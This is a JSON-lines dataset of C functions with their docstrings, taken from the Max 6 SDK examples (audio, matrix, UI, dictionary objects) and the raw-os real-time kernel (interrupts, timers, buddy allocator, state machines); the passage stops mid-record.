{"docstring": "//\n//recursive functions to handle higher dimension matrices, by processing 2D sections at a time\n//\n", "func_signal": "void jit_rgb2luma_calculate_ndim(t_jit_rgb2luma *x, long dimcount, long *dim, long planecount, \n\tt_jit_matrix_info *in_minfo, char *bip, t_jit_matrix_info *out_minfo, char *bop)", "code": "{\n\tlong i,j,width,height;\n\tuchar *ip,*op;\n\tlong tmp,safe,total;\n\tlong ascale = x->ascale * 65536.;\n\tlong rscale = x->rscale * 65536.;\n\tlong gscale = x->gscale * 65536.;\n\tlong bscale = x->bscale * 65536.;\n\n\tif (dimcount<1) return; //safety\n\t\n\t\n\tswitch(dimcount) {\n\tcase 1:\n\t\tdim[1]=1;\n\tcase 2:\n\t\tsafe = (((ascale+rscale+gscale+bscale)<=65536)&&(ascale>=0)&&(rscale>=0)&&(gscale>=0)&&(bscale>=0));\n\t\t\t\t\n\t\twidth  = dim[0];\n\t\theight = dim[1];\n\t\tif (safe) {\t\n\t\t\tfor (i=0;i<height;i++){\n\t\t\tip = bip + i*in_minfo->dimstride[1];\n\t\t\top = bop + i*out_minfo->dimstride[1];\n\t\t\t\n\t\t\t\tfor (j=0;j<width;j++) {\n\t\t\t\t\t*op++ = ((*(ip) * ascale) + (*(ip + 1) * rscale) + (*(ip + 2) * gscale) + (*(ip + 3) * bscale)) >> 16L;\n\t\t\t\t\tip+=4;\n\t\t\t\t}\n\t\t\t}\n\t\t} else {\n\t\tfor (i=0;i<height;i++){\n\t\t\tip = bip + i*in_minfo->dimstride[1];\n\t\t\top = bop + i*out_minfo->dimstride[1];\n\t\t\t\n\t\t\t\tfor (j=0;j<width;j++) {\n\t\t\t\t\ttmp = ((*(ip) * ascale) + (*(ip + 1) * rscale) + (*(ip + 2) * gscale) + (*(ip + 3) * bscale)) >> 16L;\n\t\t\t\t\t*op++ = CLAMP(tmp, 0, 255);\n\t\t\t\t\tip+=4;\n\t\t\t\t}\n\t\t\t}\n\t\t}\t\n\t\tbreak;\n\tdefault:\n\t\tfor\t(i=0;i<dim[dimcount-1];i++) {\n\t\t\tip = bip + i*in_minfo->dimstride[dimcount-1];\n\t\t\top = bop + i*out_minfo->dimstride[dimcount-1];\n\t\t\tjit_rgb2luma_calculate_ndim(x,dimcount-1,dim,planecount,in_minfo,ip,out_minfo,op);\n\t\t}\n\t}\n}", "path": "examples\\matrix\\jit.rgb2luma\\jit.rgb2luma.c", "repo_name": "Cycling74/max6-sdk", "stars": 107, "license": "None", "language": "c", "size": 8623}
{"docstring": "/*t_jit_err max_jit_pack_jump(t_max_jit_pack *x, t_symbol *s, long argc, t_atom *argv)\n{\n\tlong i, totalPlanes=0;\n\tvoid *m;\n\n\tfor (i=0; i < MIN(argc, x->inlets); i++) {\n\t\tx->jump[i] = MAX( jit_atom_getlong(argv + i), 1);\n\t\tx->cumjump[i] = totalPlanes;\n\t\ttotalPlanes += x->jump[i];\n\t}\n\t\n\t//handles case where jump list is less than number of inlets\n\t//set to default jump value\n\twhile(i < x->inlets) {\n\t\tx->jump[i] = 1;\n\t\tx->cumjump[i] = totalPlanes;\n\t\ttotalPlanes += 1;\n\t\ti++;\n\t}\n\t\n\tm = max_jit_mop_getoutput(x,1);\t\t\t\n\tjit_attr_setlong(m,_jit_sym_planecount,totalPlanes);\n\t\n\tx->jumpcount = i;\n\t\n\treturn JIT_ERR_NONE;\n}*/\n", "func_signal": "void setOutputPlanes(t_max_jit_pack *x)", "code": "{\n\tlong i, outputPlanes=0;\n\tt_atom_long jump[JIT_MATRIX_MAX_PLANECOUNT];\n\tvoid *o;\n\t\n\to = max_jit_obex_jitob_get(x);\n\tjit_attr_getlong_array(o, gensym(\"jump\"), JIT_MATRIX_MAX_PLANECOUNT, jump);\n\t\n\tfor(i=0; i < x->inlets; i++) {\n\t\toutputPlanes += jump[i];\n\t}\n\t\n\to = max_jit_mop_getoutput(x,1);\t\t\t\n\tjit_attr_setlong(o,_jit_sym_planecount,outputPlanes);\n}", "path": "examples\\matrix\\jit.pack\\max.jit.pack.c", "repo_name": "Cycling74/max6-sdk", "stars": 107, "license": "None", "language": "c", "size": 8623}
{"docstring": "//***********************************************************************************************\n", "func_signal": "int C74_EXPORT main(void)", "code": "{\t\n\tt_class* c = class_new(\"split~\", (method)split_new, (method)dsp_free, sizeof(t_split), NULL, A_GIMME, 0);\n\t\n\tclass_addmethod(c, (method)split_int,\t\t\"int\",\t\tA_LONG, 0);\n\tclass_addmethod(c, (method)split_float,\t\t\"float\",\tA_FLOAT, 0);\n\tclass_addmethod(c, (method)split_dsp,\t\t\"dsp\",\t\tA_CANT, 0);\t\t// Old 32-bit MSP dsp chain compilation for Max 5 and earlier\n\tclass_addmethod(c, (method)split_dsp64,\t\t\"dsp64\",\tA_CANT, 0);\t\t// New 64-bit MSP dsp chain compilation for Max 6\n\tclass_addmethod(c, (method)split_assist,\t\"assist\",\tA_CANT, 0);\n\t\n\tclass_dspinit(c);\n\tclass_register(CLASS_BOX, c);\n\ts_split_class = c;\n\n\treturn 0;\n}", "path": "examples\\audio\\split~\\split~.c", "repo_name": "Cycling74/max6-sdk", "stars": 107, "license": "None", "language": "c", "size": 8623}
{"docstring": "// The jsave method is called when the patcher is being saved so that we can add custom data (data that is not an attribute)\n// to the patcher dictionary.\n", "func_signal": "void uitextfield_jsave(t_uitextfield *x, t_dictionary *d)", "code": "{\n\tt_object\t*textfield = jbox_get_textfield((t_object*)x);\n\tlong\t\tsize = 0;\n\tchar\t\t*text = NULL;\n\t\n\tobject_method(textfield, gensym(\"gettextptr\"), &text, &size);\n\tif (size)\n\t\tdictionary_appendsym(d, gensym(\"my_string\"), gensym(text));\n\telse\n\t\tdictionary_appendsym(d, gensym(\"my_string\"), gensym(\"\"));\n}", "path": "examples\\ui\\uitextfield\\uitextfield.c", "repo_name": "Cycling74/max6-sdk", "stars": 107, "license": "None", "language": "c", "size": 8623}
{"docstring": "/************************************************************************************/\n", "func_signal": "void *dict_route_new(t_symbol *s, long argc, t_atom *argv)", "code": "{\n\tt_dict_route \t*x = (t_dict_route *)object_alloc(s_dict_route_class);\n\tlong\t\t\tattrstart = attr_args_offset(argc, argv);\n\tt_dictionary\t*d = NULL;\t// dictionary with our 'prototype' specified by args to this object\n\t\n\tif (x) {\n\t\tx->outlet_nomatch = outlet_new(x, \"dictionary\");\n\t\tx->outlet_dict = outlet_new(x, \"dictionary\");\n\t\tx->inlet_tomatch = proxy_new(x, 1, &x->inletnum);\n\t\t\n\t\tif (attrstart)\n\t\t\tdictobj_dictionaryfromatoms(&d, attrstart, argv);\n\t\tif (!d) {\n\t\t\tchar\t\terrorstring[256];\n\t\t\tt_max_err\terr;\n\t\t\t\n\t\t\terr = dictobj_dictionaryfromstring(&d, \"{ \\\"schema\\\" : \\\"*\\\" }\", true, errorstring);\n\t\t\tif (err)\n\t\t\t\terror(\"dict.route: %s\", errorstring);\n\t\t}\n\t\tx->schema_dict = dictobj_register(d, &x->schema_name);\n\t\t\n\t\tattr_args_process(x, argc, argv);\n\t}\n\treturn x;\n}", "path": "examples\\dictionary\\dict.route\\dict.route.c", "repo_name": "Cycling74/max6-sdk", "stars": 107, "license": "None", "language": "c", "size": 8623}
{"docstring": "/**********************************************************************/\n// Methods\n", "func_signal": "void uitextfield_bang(t_uitextfield *x)", "code": "{\n\tt_object *textfield = NULL;\n\tjbox_get_textfield((t_object *)x);\n\tif (textfield) {\n\t\t;\n\t}\n}", "path": "examples\\ui\\uitextfield\\uitextfield.c", "repo_name": "Cycling74/max6-sdk", "stars": 107, "license": "None", "language": "c", "size": 8623}
{"docstring": "// slider has 6 args: x, y, w, size (height), min, and mult\n", "func_signal": "void *jslider_stdargs(t_dictionary *d, t_symbol *s, long argc, t_atom *argv)", "code": "{\n\tlong left, top, width, height, thin, length;\n\tshort horiz, type;\n\tt_atom at[4];\n\t\n\thoriz = (s == ps_hslider) ? 1 : 0;\n\ttype = (s == ps_slider) ? 0 : 1; // Miller's original slider (relative mousing by default)\n\t\t\t\n\tif (d && argc>3 && argv) {\n\t\n\t\t// all psaved versions should have the first 4 args, even if it's a really old patch\n\t\tleft = atom_getlong(argv);\n\t\ttop = atom_getlong(argv+1);\n\t\tthin = atom_getlong(argv+2);\n\t\tlength = atom_getlong(argv+3);\n\t\theight = (horiz) ? thin : length+(type?16:7); // we need to add 16 because we have an 8 pixel border on either side of x->s_size\n\t\twidth = (horiz) ? length+(16) : thin; // old vanilla slider was always vert so we don't need to check type\n\t\t\n\t\tatom_setlong(at+0, left);\n\t\tatom_setlong(at+1, top);\n\t\tatom_setlong(at+2, width);\n\t\tatom_setlong(at+3, height);\n\t\t\n\t\tdictionary_appendatoms(d, _sym_patching_rect, 4, at); // rect is x y width, height, like t_rect, but with long args\n\t\t\n\t\t//dictionary_appendatom(d, gensym(\"max\"), argv+3);  // argv+3 is both the max and the height when importing from a miller slider\n\t\t// slider and u/hslider have different order... don't ask why...\n\t\tif (!type && argc > 5) {\n\t\t\tdictionary_appendatom(d, gensym(\"size\"), argv+3);\n\t\t\tdictionary_appendatom(d, gensym(\"min\"), argv+4); \n\t\t\tdictionary_appendatom(d, gensym(\"mult\"), argv+5); \n\t\t} else if (type && argc > 6) {\n\t\t\tdictionary_appendatom(d, gensym(\"size\"), argv+4);\n\t\t\tdictionary_appendatom(d, gensym(\"mult\"), argv+5); \n\t\t\tdictionary_appendatom(d, gensym(\"min\"), argv+6); \n\t\t}\n\n\t\t// if it's an old slider and we're doing the stdargs then it's forced either horiz or vert, for compatibility\n\t\tif (horiz)\n\t\t\tdictionary_appendlong(d, gensym(\"orientation\"), 1); // force horizontal\n\t\telse\n\t\t\tdictionary_appendlong(d, gensym(\"orientation\"), 2); // force vertical\n\t\t\t\n\t\tdictionary_appendlong(d, gensym(\"relative\"), type ? 0 : 1); \n\t\t\n\t\t// if it's hslider/uslider it does have an extra value which defines the color background\n\t\tif (type && argc > 7) {\n\t\t\tt_jrgba bgcolor;\n\t\t\tlong color = CLAMP(atom_getlong(argv+7), 0, 15); // constrains colors to 0-15 zone\n\t\t\tset_jrgba_from_boxcolor_index(color + 1, &bgcolor);\n\t\t\t\n\t\t\tdictionary_appendjrgba(d, gensym(\"bgcolor\"), &bgcolor);\n\t\t}\n\t}\n\treturn 0;\n}", "path": "examples\\ui\\jslider\\jslider.c", "repo_name": "Cycling74/max6-sdk", "stars": 107, "license": "None", "language": "c", "size": 8623}
{"docstring": "// Perform (signal) Method for 3 input signals, 32-bit MSP\n", "func_signal": "t_int* split_perform3(t_int* w)", "code": "{\n\tt_float\t*in1 = (t_float*)(w[1]);\t// Input 1\n\tt_float\t*out1 = (t_float*)(w[4]);\t// Output 1\n\tt_float\t*out2 = (t_float*)(w[5]);\t// Output 2\n\tt_float\t*out3 = (t_float*)(w[6]);\t// Output 3    \n   \tt_split\t*x = (t_split*)(w[7]);\t\t// Object Pointer\n\tint\t\tn = (int)(w[8]);\t\t\t// \"Vector\" Size\n\tt_float\tvalue, low, high;\n\t\n\t// low and high only updated at the vector-rate, for efficiency \n\t// (cpu was in short supply on the G3 PowerBook when this object was written)\n \tlow  = x->s_connected[1]? *(t_float *)(w[2]) : x->s_low;\n\thigh = x->s_connected[2]? *(t_float *)(w[3]) : x->s_high;\n\t\n\twhile (n--){\n\t\tvalue = *in1++;\n\t\tif ((value >= low) && (value <= high)) {\t\n\t\t\t*out1++ = value;\n\t\t\t*out2++ = 0;\n\t\t\t*out3++ = 1;\n\t\t}\n\t\telse {\n\t\t\t*out1++ = 0;\n\t\t\t*out2++ = value;\n\t\t\t*out3++ = 0; \t \t\n\t\t}\t\t\t\t\t\t\t\t\t\t\t\n\t}\n\treturn w+9;\t // return pointer to NEXT object in dsp chain\n}", "path": "examples\\audio\\split~\\split~.c", "repo_name": "Cycling74/max6-sdk", "stars": 107, "license": "None", "language": "c", "size": 8623}
{"docstring": "// Perform (signal) Method for 1 input signal, 32-bit MSP\n", "func_signal": "t_int *split_perform1(t_int *w)", "code": "{\n\tt_float\t*in1 = (t_float*)(w[1]);\t// Input 1\n\tt_float\t*out1 = (t_float*)(w[2]);\t// Output 1\n\tt_float\t*out2 = (t_float*)(w[3]);\t// Output 2\n\tt_float\t*out3 = (t_float*)(w[4]);\t// Output 3    \n   \tt_split\t*x = (t_split*)(w[5]);\t\t// Object Pointer\n\tint\t\tn = (int)(w[6]);\t\t\t// \"Vector\" Size\n\tt_float\tvalue;\n\tt_float\tlow = x->s_low;\t\t\t\t// cache struct object members locally to keep them in registers on the processor\n\tt_float\thigh = x->s_high;\t\t\t// ... thus improving performance.\n\t\n\twhile (n--) {\n\t\tvalue = *in1++;\n\t\tif ((value >= low) && (value <= high)){\n\t\t\t*out1++ = value;\n\t\t\t*out2++ = 0;\n\t\t\t*out3++ = 1;\n\t\t}\n\t\telse {\n\t\t\t*out1++ = 0;\n\t\t\t*out2++ = value;\n\t\t\t*out3++ = 0;\n\t\t}\n\t}\n\treturn w+7;\t // return pointer to NEXT object in dsp chain\n}", "path": "examples\\audio\\split~\\split~.c", "repo_name": "Cycling74/max6-sdk", "stars": 107, "license": "None", "language": "c", "size": 8623}
{"docstring": "// Perform (signal) Method for 3 input signals, 64-bit MSP\n", "func_signal": "void split_perform364(t_split *x, t_object *dsp64, double **ins, long numins, double **outs, long numouts, long sampleframes, long flags, void *userparam)", "code": "{\n\tt_double\t*in1 = ins[0];\t\t// Input 1\n\tt_double\t*out1 = outs[0];\t// Output 1\n\tt_double\t*out2 = outs[1];\t// Output 2\n\tt_double\t*out3 = outs[2];\t// Output 3\n\tint\t\t\tn = sampleframes;\n\tt_double\tvalue, low, high;\n\t\n\t// low and high only updated at the vector-rate, for efficiency \n\t// (cpu was in short supply on the G3 PowerBook when this object was written)\n \tlow  = x->s_connected[1]? *ins[1] : x->s_low;\n\thigh = x->s_connected[2]? *ins[2] : x->s_high;\n\t\n\twhile (n--){\n\t\tvalue = *in1++;\n\t\tif ((value >= low) && (value <= high)) {\t\n\t\t\t*out1++ = value;\n\t\t\t*out2++ = 0;\n\t\t\t*out3++ = 1;\n\t\t}\n\t\telse {\n\t\t\t*out1++ = 0;\n\t\t\t*out2++ = value;\n\t\t\t*out3++ = 0; \t \t\n\t\t}\t\t\t\t\t\t\t\t\t\t\t\n\t}\n}", "path": "examples\\audio\\split~\\split~.c", "repo_name": "Cycling74/max6-sdk", "stars": 107, "license": "None", "language": "c", "size": 8623}
{"docstring": "/*---------------------------------------------------------------------------*/\n/**\n * Check if a timer has expired.\n *\n * This function tests if a timer has expired and returns true or\n * false depending on its status.\n *\n * \\param t A pointer to the timer\n *\n * \\return Non-zero if the timer has expired, zero otherwise.\n *\n */\n", "func_signal": "int\ntimer_expired(struct timer *t)", "code": "{\n  /* Note: Can not return diff >= t->interval so we add 1 to diff and return\n     t->interval < diff - required to avoid an internal error in mspgcc. */\n  clock_time_t diff = (clock_time() - t->start) + 1;\n  return t->interval < diff;\n\n}", "path": "extension\\protothread\\timer.c", "repo_name": "jorya/raw-os", "stars": 77, "license": "lgpl-3.0", "language": "c", "size": 824}
{"docstring": "/*\n************************************************************************************************************************\n*                                    Set system time\n*\n* Description: This function is called to set system time.\n*\n* Arguments  :NONE\n*                \n*               \n*                \n*                 \n*\t\t\t\t         \n* Returns\t\t\n*\t\t\t\t\traw_tick_count: The raw_os time.\n* Note(s)    \n*             \n************************************************************************************************************************\n*/\n", "func_signal": "RAW_OS_ERROR raw_system_time_set(RAW_TICK_TYPE time)", "code": "{\n\tRAW_SR_ALLOC();\n\n\tif (raw_int_nesting) {\n\n\t\treturn RAW_NOT_CALLED_BY_ISR;\n\t}\n\t\n\tRAW_CRITICAL_ENTER();\n\traw_tick_count = time;\n\tRAW_CRITICAL_EXIT();\n\n\treturn RAW_SUCCESS;\n\n}", "path": "raw_system.c", "repo_name": "jorya/raw-os", "stars": 77, "license": "lgpl-3.0", "language": "c", "size": 824}
{"docstring": "/*\n************************************************************************************************************************\n*                                    Finish interrupt\n*\n* Description: This function is called to when exit interrupt.\n*\n* Arguments  :NONE\n*                \n*               \n*                \n*                 \n*\t\t\t\t         \n* Returns\t\t\n*\t\t\t\t\t\n* Note(s)    \n*             \n************************************************************************************************************************\n*/\n", "func_signal": "void raw_finish_int(void)", "code": "{\n\n\tRAW_SR_ALLOC();\n\n\t#if (CONFIG_RAW_ISR_STACK_CHECK > 0)\n\t\n\t/*if you have no idea how to implement this function just write a blank port function*/\n\tport_isr_stack_check();\n\t\n\t#endif\n\n\t/*It should not be zero here*/\n\tRAW_ASSERT(raw_int_nesting != 0);\n\t\n\tUSER_CPU_INT_DISABLE();\n\n\traw_int_nesting--;\n\t/*if still interrupt nested just return */\n\tif (raw_int_nesting) {              \n\t\tUSER_CPU_INT_ENABLE();                                  \n\t\treturn;\n\t}\n\t/*if system is locked then just return*/\n\tif (raw_sched_lock) { \n\n\t\tUSER_CPU_INT_ENABLE(); \n\t\treturn;\n\t}\n\n\t/*get the highest task*/\n\tget_ready_task(&raw_ready_queue);\n\n\t/*if the current task is still the highest task then we do not need to have interrupt switch*/ \n\tif (high_ready_obj == raw_task_active) {                 \n\t\tUSER_CPU_INT_ENABLE();                                     \n\t\treturn;\n\t}\n\n\tTRACE_INT_TASK_SWITCH(raw_task_active, high_ready_obj);\n\t\n\t/*switch to the highest task, this function is cpu related, thus need to be ported*/\n\traw_int_switch();  \n\n\tUSER_CPU_INT_ENABLE();  \n\n}", "path": "raw_system.c", "repo_name": "jorya/raw-os", "stars": 77, "license": "lgpl-3.0", "language": "c", "size": 824}
{"docstring": "/*-----------------------------------------------------------*/\n", "func_signal": "void mem_1_free(void *pv)", "code": "{\n\t/* Memory cannot be freed using this scheme.  See heap_2.c, heap_3.c and\n\theap_4.c for alternative implementations, and the memory management pages of\n\thttp://www.FreeRTOS.org for more information. */\n\t( void ) pv;\n\n\t/* Force an assert as it is invalid to call this function. */\n\tRAW_ASSERT(pv == NULL);\n}", "path": "extension\\mm\\heap_1.c", "repo_name": "jorya/raw-os", "stars": 77, "license": "lgpl-3.0", "language": "c", "size": 824}
{"docstring": "/** Create buddy system.\n *\n * Allocate memory for and initialize new buddy system.\n *\n * @param b\t\tPreallocated buddy system control data.\n * @param max_order\tThe biggest allocable size will be 2^max_order.\n * @param op\t\tOperations for new buddy system.\n * @param data\t\tPointer to be used by implementation.\n *\n * @return\t\tNew buddy system.\n */\n", "func_signal": "void\nbuddy_system_create(buddy_system_t *b, RAW_U8 max_order,\n    buddy_system_operations_t *op, void *data)", "code": "{\n\tint i;\n\n\tASSERT(max_order < BUDDY_SYSTEM_INNER_BLOCK);\n\n\tASSERT(op->find_buddy);\n\tASSERT(op->set_order);\n\tASSERT(op->get_order);\n\tASSERT(op->bisect);\n\tASSERT(op->coalesce);\n\tASSERT(op->mark_busy);\n\n\n\t/*\n\t * Use memory after our own structure.\n\t */\n\tb->order = (link_t *) (&b[1]);\n\t\n\tfor (i = 0; i <= max_order; i++)\n\t\tlist_initialize(&b->order[i]);\n\n\tb->max_order = max_order;\n\tb->op = op;\n\tb->data = data;\n}", "path": "extension\\mm\\slab\\raw_buddy.c", "repo_name": "jorya/raw-os", "stars": 77, "license": "lgpl-3.0", "language": "c", "size": 824}
{"docstring": "/*Provide workqueue level system tick process, to impromve interrupt response, refer to example hot to use it*/\n", "func_signal": "void tick_work_handler(RAW_U32 arg, void *msg)", "code": "{\n\tmsg = msg;\n\n\t#if (CONFIG_RAW_USER_HOOK > 0)\n\traw_tick_hook();\n\t#endif\n\n\t/*update system time to calculate whether task timeout happens*/\n\t/*Need not another task to handle tick process*/\n\ttick_list_update();\n\n\t/*update task time slice if possible*/\n\t/*arg is important!Please refer to example how to use it*/\n\t#if (CONFIG_SCHED_FIFO_RR > 0)\n\tcalculate_time_slice(arg);\n\t#endif\n\t\n\t/*inform the timer task to update software timer*/\t\n\t#if (CONFIG_RAW_TIMER > 0)\n\tcall_timer_task();\n\t#endif\n\n}", "path": "extension\\lib\\raw_work_queue.c", "repo_name": "jorya/raw-os", "stars": 77, "license": "lgpl-3.0", "language": "c", "size": 824}
{"docstring": "/** Return block to buddy system.\n *\n * @param b\t\tBuddy system pointer.\n * @param block\t\tBlock to return.\n */\n", "func_signal": "void buddy_system_free(buddy_system_t *b, link_t *block)", "code": "{\n\tlink_t *buddy, *hlp;\n\tRAW_U8 i;\n\n\t/*\n\t * Determine block's order.\n\t */\n\ti = b->op->get_order(b, block);\n\n\tASSERT(i <= b->max_order);\n\n\tif (i != b->max_order) {\n\t\t/*\n\t\t * See if there is any buddy in the list of order i.\n\t\t */\n\t\tbuddy = b->op->find_buddy(b, block);\n\t\tif (buddy) {\n\n\t\t\tASSERT(b->op->get_order(b, buddy) == i);\n\t\t\t/*\n\t\t\t * Remove buddy from the list of order i.\n\t\t\t */\n\t\t\tlist_remove(buddy);\n\t\t\n\t\t\t/*\n\t\t\t * Invalidate order of both block and buddy.\n\t\t\t */\n\t\t\tb->op->set_order(b, block, BUDDY_SYSTEM_INNER_BLOCK);\n\t\t\tb->op->set_order(b, buddy, BUDDY_SYSTEM_INNER_BLOCK);\n\t\t\n\t\t\t/*\n\t\t\t * Coalesce block and buddy into one block.\n\t\t\t */\n\t\t\thlp = b->op->coalesce(b, block, buddy);\n\n\t\t\t/*\n\t\t\t * Set order of the coalesced block to i + 1.\n\t\t\t */\n\t\t\tb->op->set_order(b, hlp, i + 1);\n\n\t\t\t/*\n\t\t\t * Recursively add the coalesced block to the list of\n\t\t\t * order i + 1.\n\t\t\t */\n\t\t\tbuddy_system_free(b, hlp);\n\t\t\treturn;\n\t\t}\n\t}\n\n\t/*\n\t * Insert block into the list of order i.\n\t */\n\tlist_append(block, &b->order[i]);\n}", "path": "extension\\mm\\slab\\raw_buddy.c", "repo_name": "jorya/raw-os", "stars": 77, "license": "lgpl-3.0", "language": "c", "size": 824}
{"docstring": "/*\n************************************************************************************************************************\n*                                   Init the finit state machine\n*\n* Description: This function is used to init the finit state machine.\n*\n* Arguments  :me is the state machine\n*                    ---------\n*                    e is the trig event   \n*\t\t\t\t         \n* Returns\t\t\t\n*\t\t\t\t\t\t\n* Note(s)    \t\n*\n*             \n************************************************************************************************************************\n*/\n", "func_signal": "void fsm_init(STM_STRUCT *me, STATE_EVENT *e)", "code": "{\n    RAW_U16 ret;\n\t\n    if (me->temp == 0) {\n\n\t\tRAW_ASSERT(0);\n\n    }\n\n\t/*do the fsm constructor init function*/\n\tret = (*me->temp)(me, e);\n\n\t/*transition must happen here*/\n\tif (ret != STM_RET_TRAN) {\n\t\t\n\t\tRAW_ASSERT(0);\n\t}\n\n\t/*trig the STM_ENTRY_SIG to the new transioned state*/\n    STM_TRIG(me->temp, STM_ENTRY_SIG);\n\n\t/*change to new state*/\n    me->state = me->temp; \n   \n}", "path": "raw_stm.c", "repo_name": "jorya/raw-os", "stars": 77, "license": "lgpl-3.0", "language": "c", "size": 824}
{"docstring": "/*\n************************************************************************************************************************\n*                                   The top of the hsm state machine\n*\n* Description: This function is used to init the hsm state machine to state hsm_top.\n*\n* Arguments  :me (unused)\n*                    ---------\n*                    e (unused)   \n*\t\t\t\t         \n* Returns\t\t\t\n*\t\t\t\t\t\t\n* Note(s)    \t\n*\n*             \n************************************************************************************************************************\n*/\n", "func_signal": "RAW_U16 hsm_top(void  *me, STATE_EVENT *e)", "code": "{\n    me = me;       \n    e = e; \n\t\n    return STM_RET_IGNORED;                 \n}", "path": "raw_stm.c", "repo_name": "jorya/raw-os", "stars": 77, "license": "lgpl-3.0", "language": "c", "size": 824}
{"docstring": "/*\n************************************************************************************************************************\n*                                    Enter interrupt\n*\n* Description: This function is called to when enter into interrupt.\n*\n* Arguments  :NONE\n*                \n*               \n*                \n*                 \n*\t\t\t\t         \n* Returns\t\t\n*\t\t\t\t\t\n* Note(s) raw_int_nesting can directly be accessed by interrupt function with cpu interrupt disabled!\n*you must invoke raw_enter_interrupt before calling interrupt function.\n*you must  invoke  raw_finish_int after calling interrupt function.\n* you must invoke raw_enter_interrupt and raw_finish_int in pair.\n*             \n************************************************************************************************************************\n*/\n", "func_signal": "RAW_OS_ERROR raw_enter_interrupt(void)", "code": "{\n\tRAW_SR_ALLOC();\n\n\tRAW_CPU_DISABLE();\n\t\n\tif (raw_int_nesting >= INT_NESTED_LEVEL) {  \n\n\t\tRAW_CPU_ENABLE();\n\t\t\n\t\tport_system_error_process(RAW_EXCEED_INT_NESTED_LEVEL, 0, 0, 0, 0, 0, 0);\n\t\t\n\t\treturn RAW_EXCEED_INT_NESTED_LEVEL;                                                                                      \n\t}\n\n\traw_int_nesting++; \n\tRAW_CPU_ENABLE();\n\n\treturn RAW_SUCCESS;\n}", "path": "raw_system.c", "repo_name": "jorya/raw-os", "stars": 77, "license": "lgpl-3.0", "language": "c", "size": 824}
{"docstring": "/** Allocate block from buddy system.\n *\n * @param b\t\tBuddy system pointer.\n * @param i\t\tReturned block will be 2^i big.\n *\n * @return\t\tBlock of data represented by link_t.\n */\n", "func_signal": "link_t *buddy_system_alloc(buddy_system_t *b, RAW_U8 i)", "code": "{\n\tlink_t *res, *hlp;\n\n\tASSERT(i <= b->max_order);\n\n\t/*\n\t * If the list of order i is not empty,\n\t * the request can be immediatelly satisfied.\n\t */\n\tif (!list_empty(&b->order[i])) {\n\t\tres = b->order[i].next;\n\t\tlist_remove(res);\n\t\tb->op->mark_busy(b, res);\n\t\treturn res;\n\t}\n\t/*\n\t * If order i is already the maximal order,\n\t * the request cannot be satisfied.\n\t */\n\tif (i == b->max_order)\n\t\treturn NULL;\n\n\t/*\n\t * Try to recursively satisfy the request from higher order lists.\n\t */\t\n\thlp = buddy_system_alloc(b, i + 1);\n\t\n\t/*\n\t * The request could not be satisfied\n\t * from higher order lists.\n\t */\n\tif (!hlp)\n\t\treturn NULL;\n\t\t\n\tres = hlp;\n\t\n\t/*\n\t * Bisect the block and set order of both of its parts to i.\n\t */\n\thlp = b->op->bisect(b, res);\n\tb->op->set_order(b, res, i);\n\tb->op->set_order(b, hlp, i);\n\t\n\t/*\n\t * Return the other half to buddy system. Mark the first part\n\t * full, so that it won't coalesce again.\n\t */\n\tb->op->mark_busy(b, res);\n\tbuddy_system_free(b, hlp);\n\t\n\treturn res;\n}", "path": "extension\\mm\\slab\\raw_buddy.c", "repo_name": "jorya/raw-os", "stars": 77, "license": "lgpl-3.0", "language": "c", "size": 824}
{"docstring": "/*\n************************************************************************************************************************\n*                                   exceute the finit state machine\n*\n* Description: This function is used to exceute the finit state machine.\n*\n* Arguments  :me is the state machine\n*                    ---------\n*                    e is the trig event \n*\t\t\t\t         \n* Returns\t\t\t\n*\t\t\t\t\t\t\n* Note(s)    \t\n*\n*             \n************************************************************************************************************************\n*/\n", "func_signal": "void fsm_exceute(STM_STRUCT *me, STATE_EVENT *e)", "code": "{\n\tRAW_U16 ret;\n\n\t/*State must be stable here*/\n\tif (me->state != me->temp) {\n\n\t\tRAW_ASSERT(0);\n\n\t}\n\n\t/*exceute the state function with new event*/\n    ret = (*me->state)(me, e); \n\t\n    if (ret == STM_RET_TRAN) {                            \n\n\t\t/*exit the original state */\n\t\tSTM_EXIT(me->state); \n\t\t/*enter the new state*/\n\t\tSTM_ENTER(me->temp); \n\t\t/*change to new state*/\n\t\tme->state = me->temp; \n    }\n   \n}", "path": "raw_stm.c", "repo_name": "jorya/raw-os", "stars": 77, "license": "lgpl-3.0", "language": "c", "size": 824}
{"docstring": "/*\n************************************************************************************************************************\n*                                   Init the hsm state machine\n*\n* Description: This function is used to init the finit state machine.\n*\n* Arguments  :me is the state machine\n*                    ---------\n*                    e is the trig event   \n*\t\t\t\t         \n* Returns\t\t\t\n*\t\t\t\t\t\t\n* Note(s)    \t\n*\n*             \n************************************************************************************************************************\n*/\n", "func_signal": "void hsm_init(STM_STRUCT *me, STATE_EVENT *e)", "code": "{\n\tRAW_U16 ret;\n\tRAW_S8 ip;\n\n\t/*Max nested state levels*/\n\tstm_state_handler path[STM_MAX_NEST_DEPTH];\n\t        \n\tstm_state_handler t = me->state;\n\n\tif (me->temp == 0) {\n\n\t\tRAW_ASSERT(0);\n\n\t}\n\n\n\t/*if state is not equal to the hsm top state, just assert*/\n\tif (t != STM_STATE_CAST(hsm_top)) {\n\n\t\tRAW_ASSERT(0);\n\t}\n\n\n\n\t/*do the hsm constructor init function*/\n\tret = (*me->temp)(me, e);\n\n\t/*transition must happen here*/\n\tif (ret != STM_RET_TRAN) {\n\n\t\tRAW_ASSERT(0);\n\t}\n\n\n\t/*Becareful STM_INIT_SIG must trig t state to the nested children state, otherwise hsm crash*/\n\tdo { \n\t\t\n\t\tip = 0;\n\t\t\n\t\tpath[0] = me->temp;\n\n\t\t/*Find all the father state until to hsm_top*/\n\t\tSTM_TRIG(me->temp, STM_EMPTY_SIG);\n\t\t\n\t\twhile (me->temp != t) {\n\t\t\t++ip;\n\t\t\t\n\t\t\tif (ip >= STM_MAX_NEST_DEPTH) {\n\t\t\t\t\n\t\t\t\tRAW_ASSERT(0);\n\t\t\t}\n\t\t\t\n\t\t\tpath[ip] = me->temp;\n\t\t\tSTM_TRIG(me->temp, STM_EMPTY_SIG);\n\t\t}\n\t\t\n\t\tme->temp = path[0];\n\t\t                               \n\t\t/*trig STM_ENTRY_SIG from father source state to nested children state*/\n\t\tdo {        \n\t\t\tSTM_ENTER(path[ip]);                         \n\t\t\t--ip;\n\t\t} while (ip >= 0);\n\n\t\tt = path[0];  \n\t\t/*trig the STM_INIT_SIG to the new transitioned state, if new transion happened again, then we need do int init again*/\n\t} while (STM_TRIG(t, STM_INIT_SIG) == STM_RET_TRAN);\n\n\n\t/*change to new state*/\n\tme->state = t;                      \n\tme->temp  = t;                     \n\n    \n}", "path": "raw_stm.c", "repo_name": 